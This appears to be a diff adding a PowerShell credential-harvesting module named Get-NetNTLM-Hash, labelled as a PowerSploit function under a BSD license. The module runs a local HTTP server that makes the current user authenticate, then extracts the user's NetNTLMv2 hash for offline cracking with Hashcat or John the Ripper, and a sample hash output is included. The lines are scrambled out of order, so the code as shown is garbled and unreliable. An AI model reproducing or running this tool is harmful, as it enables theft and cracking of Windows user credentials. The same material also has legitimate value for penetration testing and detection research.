@@ -1,0 +1,199 @@
+    
+            
+                    
+                        
+                            $doexit = 1
+                        $client.Close()                                                                                
+                        $key = $line[0].Trim().ToLower()
+                        $requestFinished = 1                            
+                        $response = Handle-WebRequest -method $method -uri $uri -httpversion $httpver -headers $headers -body $body
+                        $val = $line[1].TrimStart()
+                        $writer.Flush()
+                        $writer.Write($response -join(''))
+                        }
+                    $line = $reader.ReadLine()
+                    $state = 1
+                    [string]$NTLMHash = Decode-NTLM($NTLMHash)                            
+                    [string]$httpver = $line[2]
+                    [string]$method = $line[0]
+                    [string]$uri = $line[1]
+                    }
+                    } else {
+                $auth[1] = $auth[1].TrimStart()
+                $port = $port 
+                $port = 0
+                [byte[]] $NTLMHash = [System.Convert]::FromBase64String($auth[1])
+                continue
+                if ($NTLMHash[8] -eq 3) {
+                if ($state -eq 0) {                
+                }
+                } elseif ($state -eq 1) {
+            $Domain = $NTLM[$Domain_offset..($Domain_offset
+            $Domain = [System.Text.Encoding]::Unicode.GetString($Domain)
+            $HostName = $NTLM[$HostName_offset..($HostName_offset
+            $HostName = [System.Text.Encoding]::Unicode.GetString($HostName)
+            $NTHash_len = 64                    
+            $client = $listener.AcceptTcpClient()
+            $foundPort = $true
+            $headers = @{}
+            $listener.Start()
+            $requestFinished = 0
+            $retval = $User
+            $state = 0
+            $stream = $client.GetStream()
+            [System.IO.StreamReader]$reader = new-object System.IO.StreamReader -argumentList $stream
+            [System.IO.StreamWriter]$writer = new-object System.IO.StreamWriter -argumentList $stream
+            [byte[]]$NTLM
+            if ($port -eq $takenPort.Localport) {
+            return $retval
+            trap [System.Net.Sockets.SocketException] {                    
+            while ($requestFinished -eq 0) {
+            }
+            }    
+           [int]$port
+        $LMHash = $NTLM[$LMHash_offset..($LMHash_offset
+        $User = $NTLM[$User_offset..($User_offset
+        $User = [System.Text.Encoding]::Unicode.GetString($User)
+        $doexit = 0
+        $foundPort = $false
+        $listener.stop()
+        (
+        )
+        [CmdletBinding()]
+        [byte[]]$NTHash = $NTLM[$NTHash_offset..($NTHash_offset
+        do {
+        foreach ($takenPort in $takenPorts) {
+        if ($NTHash_len -eq 24) { 
+        param
+        while (!$foundPort) {
+        }
+        }  while ($doexit -eq 0) 
+        } elseif ($NTHash_len -gt 24) { 
+    $job = Start-Job -ScriptBlock $NetNTLM_ScriptBlock -ArgumentList $port
+    $port = 0  
+    $random = New-Object System.Random   
+    $takenPorts = Get-NetTCPConnection -LocalAddress 127.0.0.1
+    Administrator::desktop:1122334455667788:4FFFB35....F18337AB10:0101000000000000BD526...4006F0072006D000000000000000000
+    Author: Erlend Leiknes / https://www.mnemonic.io
+    Get-NetNTLM-Hash makes the current user authenticate against an embedded HTTP-server and returns the NetNTLM(v2) hash
+    Invoke-WebRequest -uri http://localhost:$port -UseDefaultCredentials 
+    License: BSD 3-Clause
+    Optional Dependencies: None
+    PS C:
+    PowerSploit Function: Get-NetNTLM-Hash
+    Remove-Job -Job $job    
+    Required Dependencies: None
+    Retrieves the current user NetNTLM hash by authentication against an embedded HTTP-server.    
+    Start-HashServer -port $port
+    Stop-Job -Job $job
+    This hash can be cracked in tools such as Hashcat or John-The-Ripper to find the corresponding plaintext  
+    function Decode-NTLM {
+    function Handle-WebRequest {  
+    function Start-HashServer {
+    param ($port)
+    while (!$port) {
+    }
+    }   
+    }    
+  and/or other materials provided with the distribution.
+  contributors may be used to endorse or promote products derived from
+  list of conditions and the following disclaimer.
+  this list of conditions and the following disclaimer in the documentation
+  this software without specific prior written permission.
+ 1               
+ Cleanup
+ End of web request                                                                                  
+ Find available port
+ Get-NetNTLM
+ NTLM Challenge Response
+ NTLMv1
+ NTLMv2
+ Neither the name of the copyright holder nor the names of its
+ OR BUSINESS INTERRUPTION) HOWEVER
+ Request the NTLM hash from local http server
+ Start local http server in background
+ Write-Host  
+"                        $headers.Add($key,$val)"
+"                        $line = $line.Split("":"")"
+"                        if ($response -like ""HTTP/1.1 200 OK"
+"                    $line = $line.split("" "")"
+"                    if ($line -eq """") {"
+"                    return ""HTTP/1.1 200 OK"
+"            $Domain_len = [bitconverter]::ToInt16($NTLM,28)"
+"            $Domain_offset = [bitconverter]::ToInt16($NTLM,32)"
+"            $HostName_len = [bitconverter]::ToInt16($NTLM,44)"
+"            $HostName_len = [bitconverter]::ToInt16($NTLM,46)"
+"            $HostName_offset = [bitconverter]::ToInt16($NTLM,48)"
+"            $NTHash_part1 = [System.BitConverter]::ToString($NTHash[0..15]).Replace(""-"","""")"
+"            $NTHash_part2 = [System.BitConverter]::ToString($NTHash[16..$NTLM.Length]).Replace(""-"","""")"
+"            $httpver = """""
+"            $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Loopback,$port)"
+"            $method = """""
+"            $uri = """""
+"            [string[]]$auth = $headers[""authorization""].split()"
+"            [string]$method, [string]$uri, [string]$httpversion, [hashtable]$headers, [string]$body"
+"            if ($auth[0] -eq ""NTLM"") {"
+"            return ""HTTP/1.0 401 Unauthorized"
+"            return ""HTTP/1.1 401 Unauthorized"
+"        $LMHash_len = [bitconverter]::ToInt16($NTLM,12)"
+"        $LMHash_offset = [bitconverter]::ToInt16($NTLM,16)"
+"        $NTHash_len = [bitconverter]::ToInt16($NTLM,20)"
+"        $NTHash_offset = [bitconverter]::ToInt16($NTLM,24)"
+"        $User_len = [bitconverter]::ToInt16($NTLM,36)"
+"        $User_offset = [bitconverter]::ToInt16($NTLM,40)"
+"        $port = $random.Next(1025,65535)"
+"        Write-Error ""Could not parse NTLM hash"""
+"        if ($headers.Contains(""authorization"") -eq 0) {"
+"        } elseif ($headers.Contains(""authorization"")) {        "
+" LOSS OF USE, DATA, OR PROFITS"
+" Redistributions in binary form must reproduce the above copyright notice,"
+" Redistributions of source code must retain the above copyright notice, this"
+""") {"
+""":1122334455667788""        "
+""":1122334455667788:"""
+"""::"""
+"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
+"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
+"Copyright (c) 2019, El Nerdo"
+"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
+"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
+"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+"Redistribution and use in source and binary forms, with or without"
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
+"modification, are permitted provided that the following conditions are met:"
+$Domain
+$Domain_len-1)]
+$HostName
+$HostName_len-1)]
+$LMHash
+$LMHash_len-1)]
+$NTHash
+$NTHash_len-1)]
+$NTHash_part1
+$NTHash_part2
+$NTLMHash
+$NetNTLM_ScriptBlock = {
+$User_len-1)]
+.DESCRIPTION
+.EXAMPLE
+.SYNOPSIS
+> Get-NetNTLM-Hash
+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==
+Administrator::desktop:1122334455667788:4FFFB35....F18337AB10:0101000000000000BD526...4006F0072006D000000000000000000
+All rights reserved.
+BSD 3-Clause License
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+Example Usage:
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+PS C:
+Powershell module to get the NetNTLMv2 hash of the current user
+SERVICES
+function Get-NetNTLM-Hash {
+nConnection: Close
+nContent-Length: 0
+nContent-Type: text/html
+nServer: Microsoft-IIS/6.0
+nWWW-Authenticate: NTLM
+nWWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA
+nX-Powered-By: ASP.NET
